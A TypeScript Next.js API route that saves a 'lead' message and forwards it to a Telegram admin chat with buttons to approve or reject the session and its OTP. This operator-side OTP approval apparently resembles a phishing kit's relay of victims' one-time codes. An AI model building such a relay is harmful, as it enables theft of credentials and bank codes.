// app/api/support/send/route.ts
import { NextResponse } from 'next/server';
import { pushMessage } from '../../../lib/supportStore';

const BOT = process.env.TELEGRAM_BOT_TOKEN || '';
const ADMIN_CHAT = process.env.TELEGRAM_ADMIN_CHAT_ID || '';

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { sessionId, text, lang } = body || {};
    if (!sessionId || !text) {
      return NextResponse.json({ ok: false, error: 'missing sessionId or text' }, { status: 400 });
    }

    // 1) Сохраняем в локальное хранилище и получаем сохранённый объект (id/time)
    const saved = pushMessage(sessionId, {
      id: `lead-${Date.now()}`,
      from: 'lead',
      text,
      time: new Date().toISOString()
    });
    const storedId = saved.id;
    const storedTime = saved.time;

    // 2) Если Telegram не настроен, возвращаем сразу storedId/time (фронт заменит temp сообщение)
    if (!BOT || !ADMIN_CHAT) {
      return NextResponse.json({ ok: true, storedId, time: storedTime, forwarded: null, messageId: null });
    }

    // 3) Формируем сообщение для админа в Telegram (обязательно Session: `id` — парсится webhook'ом)
    const tgText = `📨 *Nuevo mensaje de lead*\nSession: \`${sessionId}\`\n\n${text}`;

    const payload = {
      chat_id: ADMIN_CHAT,
      text: tgText,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ Aprobar', callback_data: `approve_${sessionId}` },
            { text: '❌ Rechazar', callback_data: `reject_${sessionId}` }
          ],
          [
            { text: '✳️ OTP aprobado', callback_data: `approve_otp_${sessionId}` },
            { text: '✖️ OTP rechazado', callback_data: `reject_otp_${sessionId}` }
          ]
        ]
      }
    };

    // 4) Отправляем в Telegram (если что — безопасно падаем и всё равно возвращаем storedId)
    let tgJson: any = null;
    let tgMsgId: number | null = null;
    try {
      const r = await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      tgJson = await r.json().catch(() => null);
      tgMsgId = tgJson && tgJson.result ? tgJson.result.message_id : null;
    } catch (err) {
      console.error('telegram send failed', err);
    }

    // 5) Возвращаем всегда storedId/time + данные Telegram (если есть)
    return NextResponse.json({
      ok: true,
      storedId,
      time: storedTime,
      forwarded: tgJson,
      messageId: tgMsgId
    });
  } catch (err) {
    console.error('support/send error', err);
    return NextResponse.json({ ok: false, error: String(err) }, { status: 500 });
  }
}
